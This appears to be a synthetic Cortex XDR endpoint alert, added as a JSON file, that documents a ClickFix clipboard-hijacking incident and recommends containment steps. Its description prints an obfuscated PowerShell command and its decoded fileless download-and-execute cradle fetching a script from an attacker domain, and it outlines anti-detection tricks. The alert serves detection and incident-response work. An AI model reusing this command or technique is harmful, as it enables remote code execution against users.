@@ -1,0 +1,41 @@
+{
+  "vendor": "Cortex XDR",
+  "product": "Endpoint Protection",
+  "severity": "Critical",
+  "category": "Execution",
+  "alert_name": "Malicious JavaScript Clipboard Injection - ClickFix PowerShell Payload",
+  "description": "Cortex XDR detected malicious JavaScript clipboard manipulation on workstation MKTG-WKS-024 where browser process chrome.exe (PID 8924) executed clipboard.writeText() API injecting 487-byte obfuscated PowerShell command via ClickFix phishing page. Behavioral analysis shows victim visited browser-verification[.]live, clicked 'Copy Fix' button, triggering JavaScript execution: navigator.clipboard.writeText('powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQBzAC4AbABpAHYAZQAvAGQAbAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'). Base64 payload decodes to: IEX(New-Object Net.WebClient).DownloadString('https://cdn-updates[.]live/dl/payload.ps1'), classic fileless malware download technique. EDR telemetry captured clipboard modification event at 14:23:47 UTC, 8 seconds after page load, correlating with user interaction (mouse click on 'Copy Fix' button). Clipboard forensics reveal injection replaced legitimate clipboard content (previous: 'Q3 Marketing Budget spreadsheet link') with malicious PowerShell, typical ClickFix modus operandi exploiting user trust in copy-paste actions. Behavioral threat protection flagged activity based on: (1) Browser clipboard API usage without user-initiated copy action (automated injection), (2) Clipboard content containing PowerShell execution flags (-NoProfile, -ExecutionPolicy Bypass, -WindowStyle Hidden) indicating malware evasion, (3) Base64-encoded command obfuscation, (4) URL in payload pointing to newly registered domain cdn-updates[.]live (registered 2025-11-19). Memory analysis of chrome.exe process shows ClickFix JavaScript loaded from browser-verification[.]live containing anti-detection logic: checks for developer tools open, delays clipboard injection by 3 seconds to evade automated scanning, clears clipboard history after 30 seconds.",
+  "relative_timestamp_hours": 71.5,
+  "campaign_name": "ClickFix-DeerStealer",
+  "host_name": "MKTG-WKS-024",
+  "host_ip": [
+    171540620
+  ],
+  "user_name": [
+    "jdavis@marketingcorp.com"
+  ],
+  "domain": "marketingcorp.com",
+  "process_name": [
+    "chrome.exe"
+  ],
+  "process_path": [
+    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+  ],
+  "process_cmd": [
+    "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default"
+  ],
+  "threat_name": "ClickFix - Clipboard Hijacking",
+  "attack_mode": "JavaScript Clipboard Injection",
+  "verdict": "Malicious",
+  "risk_score": "96",
+  "risk_rating": "Critical",
+  "policy_type": "Behavioral Threat Protection",
+  "policy_description": "JavaScript clipboard injection with obfuscated PowerShell payload - ClickFix technique",
+  "policy_severity": "Critical",
+  "policy_recommendation": "CRITICAL: Isolate MKTG-WKS-024 immediately, clear system clipboard, kill chrome.exe process tree, check for PowerShell execution within 60 seconds of clipboard injection, block cdn-updates[.]live domain, enable Chrome security policy 'DefaultClipboardSetting: 2' (ask permission for clipboard access), deploy Cortex XDR behavioral rules detecting clipboard API abuse from browser processes, educate user on ClickFix technique (never paste commands from websites into Windows Run dialog), hunt for additional workstations accessing browser-verification[.]live",
+  "log_source": "Cortex XDR Agent - Behavioral Threat Protection",
+  "event_id": "BTP_CLIPBOARD_INJECTION",
+  "external_link": "https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/",
+  "mitre_att&ck_tactic": "TA0002 - Execution",
+  "mitre_att&ck_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell"
+}
